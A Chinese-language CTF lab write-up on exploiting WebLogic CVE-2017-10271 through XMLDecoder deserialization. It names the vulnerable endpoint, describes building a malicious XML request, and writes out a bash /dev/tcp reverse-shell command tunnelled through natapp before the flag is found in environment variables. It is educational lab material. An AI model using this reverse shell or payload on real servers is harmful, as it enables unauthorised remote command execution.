📝 WebLogic CVE-2017-10271 远程代码执行漏洞实战 Writeup

一、 靶机信息与漏洞简介

· 靶机环境：Weblogic CVE-2017-10271
· 漏洞类型：远程代码执行 (RCE)
· 漏洞原理：Oracle WebLogic Server 的 WLS Security 组件在解析 XML 数据时，使用了 XMLDecoder 进行反序列化，且未对用户输入进行严格过滤。攻击者可以构造恶意的 XML 数据，通过 ProcessBuilder 执行任意系统命令。

二、 渗透过程详解

1. 漏洞探测与请求构造
访问靶机地址后，发现目标为 WebLogic 服务。我使用 Burp Suite 抓取了一个常规的 HTTP 请求，将其发送至 Repeater 模块进行改造。

· 将请求方法从 GET 修改为 POST。
· 将请求路径修改为漏洞利用点：/wls-wsat/CoordinatorPortType11。
· 在请求头中增加 Content-Type: text/xml。
· 在请求体中构造包含 <java class="java.beans.XMLDecoder"> 的恶意 XML 数据包。
  初次发送时，靶机返回 500 错误。通过分析返回信息中的 ArrayIndexOutOfBoundsException 报错，我调整了 XML 的标签结构（去除了多余的 </string> 标签并修正了 <void> 与 <object> 的嵌套关系），最终成功让靶机解析并执行了 ProcessBuilder。

2. 内网穿透与反弹 Shell
由于靶机在公网，而我的本地测试机没有公网 IP，无法直接接收反弹 Shell。我先后尝试了 ngrok（因需要绑定信用卡放弃）和 localhost.run（因 TCP 转发受限），最终选择了国内的 natapp 工具。

· 在 natapp 官网注册并配置了一条免费的 TCP 隧道，本地端口映射为 4444，成功获得了一个公网地址（例如 da62646d.natappfree.cc:50457）。
· 修改 Payload 为反弹命令：bash -i >& /dev/tcp/公网地址/端口 0>&1（注意进行 XML 实体编码，将 > 转换为 &gt;，& 转换为 &amp;）。

3. 本地监听与获取 Shell

· 由于 Windows 环境未安装 nc，我编写了一个简单的 Python 脚本（listen.py）来实现本地 4444 端口的监听。
· 再次通过 Burp Suite 发送修改后的恶意 XML 请求。Python 脚本成功接收到了靶机反弹回来的连接，并获取了 Shell。

4. 寻找 Flag

· 在获取的 Shell 中执行 cat /flag 提示无此文件，执行 find 命令也未能搜到 flag 文件。
· 根据 CTF 解题经验，环境变量是常见的 Flag 隐藏位置。我发送 env 命令，在回显的大量环境变量中，成功找到了：
  FLAG=CTF2{59202c2b-09c0-45e6-822c-134838472db2}
